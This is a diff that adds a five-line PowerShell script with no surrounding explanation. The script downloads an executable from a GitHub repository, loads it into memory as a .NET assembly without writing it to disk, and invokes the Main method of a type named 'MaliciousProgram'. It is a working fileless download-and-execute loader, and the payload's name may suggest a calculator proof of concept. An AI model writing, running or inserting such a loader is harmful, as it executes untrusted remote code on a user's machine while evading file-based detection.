@@ -1,0 +1,5 @@
+$assembly = [System.Reflection.Assembly]::Load((Invoke-WebRequest 'https://github.com/vinhtaca/opencalcexe/raw/refs/heads/main/opencalc.exe' -UseBasicParsing).Content)
+$null = $assembly.GetTypes()
+$method = $assembly.GetType('MaliciousProgram').GetMethod('Main', [System.Reflection.BindingFlags]'Static, Public, NonPublic')
+$null = $method.Invoke($null, @())
+ 
